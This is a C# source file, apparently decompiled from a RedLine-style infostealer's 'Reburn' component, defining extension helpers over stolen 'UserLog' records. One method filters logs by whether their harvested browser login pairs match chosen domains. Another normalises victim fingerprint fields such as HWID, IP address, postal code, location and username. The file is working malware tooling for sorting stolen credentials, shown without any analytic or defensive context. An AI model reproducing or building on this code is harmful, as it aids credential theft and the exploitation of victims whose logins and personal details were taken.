using System;
using System.Collections.Generic;
using System.Linq;
using RedLine.Reburn.Models.Browsers;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Extensions;

public static class Extensions
{
	public static IEnumerable<T> DistinctBy<T, TKey>(this IEnumerable<T> items, Func<T, TKey> property)
	{
		return from x in items.GroupBy(property)
			select x.First();
	}

	public static T ChangeType<T>(this object @this)
	{
		return (T)Convert.ChangeType(@this, typeof(T));
	}

	public static string StripQuotes(this string value)
	{
		return value.Replace("\"", string.Empty);
	}

	public static bool ContainsDomains(this UserLog log, string domains)
	{
		if (string.IsNullOrWhiteSpace(domains))
		{
			return true;
		}
		string[] array = domains.Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries);
		if (array != null && array.Length == 0)
		{
			return true;
		}
		IEnumerable<LoginPair> enumerable = log.Credentials?.Browsers?.Where((Browser x) => x.Credentials != null)?.SelectMany((Browser x) => x.Credentials);
		if (enumerable == null)
		{
			return false;
		}
		if (enumerable.Count() == 0)
		{
			return false;
		}
		foreach (LoginPair item in enumerable)
		{
			string[] array2 = array;
			foreach (string value in array2)
			{
				if (item.Host.Contains(value))
				{
					return true;
				}
			}
		}
		return false;
	}

	public static void ReplaceEmptyValues(this UserLog log)
	{
		log.HWID = (string.IsNullOrWhiteSpace(log.HWID) ? "UNKNOWN" : log.HWID);
		log.MonitorSize = (string.IsNullOrWhiteSpace(log.MonitorSize) ? "UNKNOWN" : log.MonitorSize);
		log.OS = (string.IsNullOrWhiteSpace(log.OS) ? "UNKNOWN" : log.OS);
		log.TimeZone = (string.IsNullOrWhiteSpace(log.TimeZone) ? "UNKNOWN" : log.TimeZone);
		log.Username = (string.IsNullOrWhiteSpace(log.Username) ? "UNKNOWN" : log.Username);
		log.IP = (string.IsNullOrWhiteSpace(log.IP) ? "UNKNOWN" : log.IP);
		log.PostalCode = (string.IsNullOrWhiteSpace(log.PostalCode) ? "UNKNOWN" : log.PostalCode);
		log.Location = (string.IsNullOrWhiteSpace(log.Location) ? "UNKNOWN" : log.Location);
		log.Country = (string.IsNullOrWhiteSpace(log.Country) ? "UNKNOWN" : log.Country);
		log.CurrentLanguage = (string.IsNullOrWhiteSpace(log.CurrentLanguage) ? "UNKNOWN" : log.CurrentLanguage);
		log.Credentials = log.Credentials.IsNull();
	}
}
